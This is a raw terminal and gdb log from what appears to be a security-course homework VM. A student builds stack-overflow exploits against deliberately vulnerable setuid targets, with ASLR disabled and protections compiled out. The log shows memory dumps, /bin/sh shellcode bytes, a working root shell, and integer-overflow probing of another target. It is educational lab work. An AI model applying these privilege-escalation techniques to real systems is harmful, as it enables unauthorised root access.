0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1276] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1321 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff75 "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdc8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffdd4
 source language c.
 Arglist at 0xbffffdc0, args: values=0xbfffff75 "\220\220\220"
 Locals at 0xbffffdc0, Previous frame's sp is 0xbffffdc8
 Saved registers:
  ebp at 0xbffffdc0, eip at 0xbffffdc4
(gdb) x/64x $esp-128
0xbffffd30:	0x00000000	0x00000001	0xb7fff918	0x00f0b5ff
0xbffffd40:	0xbffffd7e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd50:	0xbffffd7e	0xbffffe80	0x000000e0	0x00000000
0xbffffd60:	0xb7fff000	0xb7fff918	0xbffffd80	0x08048284
0xbffffd70:	0x00000000	0xbffffe14	0xb7fbb000	0x0000ff17
0xbffffd80:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffd90:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffda0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdb0:	0x00000002	0xbffffe74	0xbffffe80	0x08048531
0xbffffdc0:	0xbffffdcc	0x080484c0	0xbfffff75	0xbffffdd8
0xbffffdd0:	0x080484fb	0xbfffff75	0x00000000	0xb7e21637
0xbffffde0:	0x00000002	0xbffffe74	0xbffffe80	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe10:	0x00000000	0x93774d75	0xa8a76365	0x00000000
0xbffffe20:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) n
10	}
(gdb) x/64x $esp-128
0xbffffd30:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffd40:	0xbffffd7e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd50:	0xbffffd7e	0xb7fff000	0x08048250	0x00000000
0xbffffd60:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd70:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd80:	0xb7fbb000	0xbffffdc0	0xb7ff0010	0xbffffe04
0xbffffd90:	0xb7f2fd80	0xbffffdb0	0xb7f2fd9d	0x00000000
0xbffffda0:	0x080484af	0xbffffdb0	0xbfffff75	0x00000014
0xbffffdb0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdc0:	0x90909090	0x080484c0	0xbfffff75	0xbffffdd8
0xbffffdd0:	0x080484fb	0xbfffff75	0x00000000	0xb7e21637
0xbffffde0:	0x00000002	0xbffffe74	0xbffffe80	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe10:	0x00000000	0x93774d75	0xa8a76365	0x00000000
0xbffffe20:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) $ebp
Undefined command: "$ebp".  Try "help".
(gdb) x/4xw $ebp
0xbffffdc0:	0x90909090	0x080484c0	0xbfffff75	0xbffffdd8
(gdb) $ebp
Undefined command: "$ebp".  Try "help".
(gdb) info frame
Stack level 0, frame at 0xbffffdc8:
 eip = 0x80484b2 in copyFourInts (target3.c:10); saved eip = 0x80484c0
 called by frame at 0x90909098
 source language c.
 Arglist at 0xbffffdc0, args: values=0xbfffff75 "\220\220\220"
 Locals at 0xbffffdc0, Previous frame's sp is 0xbffffdc8
 Saved registers:
  ebp at 0xbffffdc0, eip at 0xbffffdc4
(gdb) q
A debugging session is active.

	Inferior 1 [process 1321] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1377 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff81 "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff81 "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x21d35524	0x1a035b34	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) x/x 0xbffffdd4
0xbffffdd4:	0x080484c0
(gdb) n
10	}
(gdb) x/x 0xbffffdd4
0xbffffdd4:	0x080484c0
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff81	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffff9c	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x21d35524	0x1a035b34	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484b2 in copyFourInts (target3.c:10); saved eip = 0x80484c0
 called by frame at 0xbfffffa4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff81 "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) n
foo (
    values=0xbfffff9c "ode=\220\220\220\220\234\377\377\277\061\300\061۰\027̀\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh") at target3.c:15
15	}
(gdb) n
0x90909090 in ?? ()
(gdb) p/x getenv("shellcode")
$1 = 0x0
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 1377] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 
process 1383 is executing new program: /tmp/target3

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()
(gdb) q
A debugging session is active.

	Inferior 1 [process 1383] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main 
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) p/x getenv("shellcode")
$1 = 0x0
(gdb) n
16	  char *nops = "\x90\x90\x90";
(gdb) p/x getenv("shellcode")
$2 = 0x0
(gdb) q
A debugging session is active.

	Inferior 1 [process 1389] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1435 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff81 "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff81 "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x6161a3c5	0x5ab1add5	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff81	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffff9c	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x6161a3c5	0x5ab1add5	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa0
(gdb) n
foo (
    values=0xbfffff9c "ode=\220\220\220\220\234\377\377\277\061\300\061۰\027̀\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh") at target3.c:15
15	}
(gdb) q
A debugging session is active.

	Inferior 1 [process 1435] will be killed.

Quit anyway? (y or n) q
Please answer y or n.
A debugging session is active.

	Inferior 1 [process 1435] will be killed.

Quit anyway? (y or n) q
Please answer y or n.
A debugging session is active.

	Inferior 1 [process 1435] will be killed.

Quit anyway? (y or n) q
Please answer y or n.
A debugging session is active.

	Inferior 1 [process 1435] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitX.c -o sploit3 ; echo whoami | ./sploit3
gcc: error: sploitX.c: No such file or directory
gcc: fatal error: no input files
compilation terminated.
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3 ; echo whoami | ./sploit3
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "foooo" 399
input_size=399Hi foooo
Bye foooo
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "foooo" 3999999999999
Error: input_size not 399
input_size=2147483647Bye foooo
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "foooo" 3999999999999^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
input_size=399Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1600 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffb74) at target2.c:22
22	  int real_size = 0;
(gdb) b 15
Breakpoint 3 at 0x8048562: file target2.c, line 15.
(gdb) c
Continuing.

Breakpoint 3, greeting (temp1=0xbffffc7a 'A' <repeats 200 times>..., input_size=399) at target2.c:15
15	  strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffac8:
 eip = 0x8048562 in greeting (target2.c:15); saved eip = 0x8048635
 called by frame at 0xbffffae0
 source language c.
 Arglist at 0xbffffac0, args: temp1=0xbffffc7a 'A' <repeats 200 times>..., input_size=399
 Locals at 0xbffffac0, Previous frame's sp is 0xbffffac8
 Saved registers:
  ebp at 0xbffffac0, eip at 0xbffffac4
(gdb) x/64x 0xbffffac0-32
0xbffffaa0:	0xbffffad8	0xb7e52696	0xb7fbbd60	0x08048713
0xbffffab0:	0xbffffad0	0xb7e52670	0x0000018f	0xb7fff918
0xbffffac0:	0xbffffad8	0x08048635	0xbffffc7a	0x0000018f
0xbffffad0:	0x0000018f	0x0000018f	0x00000000	0xb7e21637
0xbffffae0:	0x00000003	0xbffffb74	0xbffffb84	0x00000000
0xbffffaf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffb00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb10:	0x00000000	0x74bc5e74	0x4f627064	0x00000000
0xbffffb20:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb30:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffb40:	0x00000003	0x08048430	0x00000000	0x08048451
0xbffffb50:	0x0804858a	0x00000003	0xbffffb74	0x08048660
0xbffffb60:	0x080486c0	0xb7fea880	0xbffffb6c	0xb7fff918
0xbffffb70:	0x00000003	0xbffffc6d	0xbffffc7a	0xbffffe0a
0xbffffb80:	0x00000000	0xbffffe0e	0xbffffe4e	0xbffffe5b
0xbffffb90:	0xbfffffeb	0x00000000	0x00000020	0xb7fd9cec
(gdb) n
16	  printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffac0-32
0xbffffaa0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffab0:	0x41414141	0x41414141	0x41414141	0x00414141
0xbffffac0:	0xbffffad8	0x08048635	0xbffffc7a	0x0000018f
0xbffffad0:	0x0000018f	0x0000018f	0x00000000	0xb7e21637
0xbffffae0:	0x00000003	0xbffffb74	0xbffffb84	0x00000000
0xbffffaf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffb00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb10:	0x00000000	0x74bc5e74	0x4f627064	0x00000000
0xbffffb20:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb30:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffb40:	0x00000003	0x08048430	0x00000000	0x08048451
0xbffffb50:	0x0804858a	0x00000003	0xbffffb74	0x08048660
0xbffffb60:	0x080486c0	0xb7fea880	0xbffffb6c	0xb7fff918
0xbffffb70:	0x00000003	0xbffffc6d	0xbffffc7a	0xbffffe0a
0xbffffb80:	0x00000000	0xbffffe0e	0xbffffe4e	0xbffffe5b
0xbffffb90:	0xbfffffeb	0x00000000	0x00000020	0xb7fd9cec
(gdb) q
A debugging session is active.

	Inferior 1 [process 1600] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/sploit2 "44444" 400
-bash: /tmp/sploit2: No such file or directory
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 400
Error: input_size not 399
input_size=400Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" .399
Error: real_size larger than input_size
input_size=0student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 399-3999
input_size=399Hi 44444
Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 0x399
Error: real_size larger than input_size
input_size=0student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 0x39
Error: real_size larger than input_size
input_size=0student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "0x39"
Error: real_size larger than input_size
input_size=0student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "1e39"
Error: real_size larger than input_size
input_size=1student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-3333333333333"
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-33333333333333"
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-333333333333"
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-33333333333"
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-333333333"
Error: real_size larger than input_size
input_size=-333333333student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-2147482047<"
Error: real_size larger than input_size
input_size=-2147482047student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "-399"
Error: real_size larger than input_size
input_size=-399student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" "+399"
input_size=399Hi 44444
Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 2147483648
Error: input_size not 399
input_size=2147483647Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 21474836480
Error: input_size not 399
input_size=2147483647Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 0919192911
Error: input_size not 399
input_size=919192911Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" 0919192911000
Error: input_size not 399
input_size=2147483647Bye 44444
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "44444" -220200300402
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Nov 30 00:03:56 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 4000000
Error: input_size not 399
input_size=2304Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 33166
Error: input_size not 399
input_size=-32370Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 33167
Error: input_size not 399
input_size=-32369Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 33190
Error: input_size not 399
input_size=-32346Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 65135
Error: input_size not 399
input_size=-401Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 65136
Error: input_size not 399
input_size=-400Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 65137
Error: input_size not 399
input_size=-399Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ /tmp/target2 "efef" 65935
input_size=399Hi efef
Bye efef
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856d: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
